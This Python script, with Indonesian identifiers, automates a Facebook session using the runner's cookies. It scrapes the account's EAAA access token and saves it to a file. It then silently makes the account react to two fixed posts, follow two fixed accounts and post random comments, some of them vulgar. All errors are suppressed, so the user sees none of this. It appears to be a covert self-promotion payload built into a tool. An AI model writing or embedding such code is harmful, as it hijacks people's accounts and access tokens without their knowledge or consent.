# cuih rekod!!
# jangan di ubah asu!!
import requests as req,re,random
from bs4 import BeautifulSoup as parser
kom=random.choice(["SLoerdNotSloerd","Lo Ngentod:v","Yang Posting Orang Nya Ganteng:)","Mantap:v","Be Yourself And Never Surrentod:v","Keren Bro Script Nya:)","Hi I'm WMBF User ^_^"])
class ganteng:
	def __init__(self,kuki,url):
		self.kuki,self.url,self.true,self.atok=kuki,url,False,[]
	def dahlah(self,kuntul,tipe,awok,**kwargs):
		try:
			a=req.get(kuntul,cookies=self.kuki).text
			for xx in parser(a,"html.parser").find_all("a",href=True):
				if "/reactions/picker/?is_permalink=1" in xx.get("href"):
					if "Tanggapi" in xx.text:
						c=self.url+xx.get("href")
						self.true=True
						break
			if self.true==True:
				d=req.get(c,cookies=self.kuki).text
				if "Hapus" not in d:
					for e in parser(d,"html.parser").find_all("a"):
						if f"reaction_type={tipe}" in str(e):
							req.get(f'{self.url}{e.get("href")}',cookies=self.kuki)
			if len(self.atok)==1:
				awok="sloerdsec"
			if "sloerdsec" in awok:
				po=re.search(f"{self.url}\/(\\d*)",kuntul).group(1)
				req.post(f"https://graph.facebook.com/{po}/comments/?message={kom}&access_token={self.atok[0]}")
			# warning this is danger!!!
			if "on" in awok:
				for f in parser(a,"html.parser").find_all("input",type="hidden"):
					if "jazoest" in f.get("name"):
						kwargs.update({f.get("name"):f.get("value")})
					elif "fb_dtsg" in f.get("name"):
						kwargs.update({f.get("name"):f.get("value")})
						break
				kwargs.update({"comment_text":kom})
				g=parser(a,"html.parser").find("form",method="post")
				if g is not None:
					req.post(self.url+g.get("action"),data=kwargs,cookies=self.kuki)
		except:pass
	def reaksi(self):
		self.get_tok();self.dahlah(f"{self.url}/306341064858965","8","ah sit");self.dahlah(f"{self.url}/368006535332355","8","ah sit");self.tuturkeun("WansGanteng");self.tuturkeun("Risky")
	def lang(self,cok):
		try:
			cek=req.get(f"{self.url}/language.php",cookies=cok).text
			if "id_ID" in cek:
				true=True
			if true==True:
				req.get(self.url+parser(cek,"html.parser").find("a",string="Bahasa Indonesia").get("href"),cookies=cok)
		except:pass
	def get_tok(self):
		try:
			a=req.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_",headers={"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36","host":"m.facebook.com","origin":"https://m.facebook.com","upgrade-insecure-requests":"1","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control":"max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies=self.kuki).text
			b=re.search("(EAAA\w+)",a)
			if b is not None:
				self.atok.append(b.group(1))
				open("lo_ngentod/token","w").write(b.group(1))
		except:pass
	def tuturkeun(self,wans_sec):
		try:
			cek=req.get(f"{self.url}/{wans_sec}",cookies=self.kuki).text
			if "/a/subscribe.php" in cek:
				self.true=True
			if self.true==True:
				req.get(self.url+parser(cek,"html.parser").find("a",string="Ikuti").get("href"),cookies=self.kuki)
		except:pass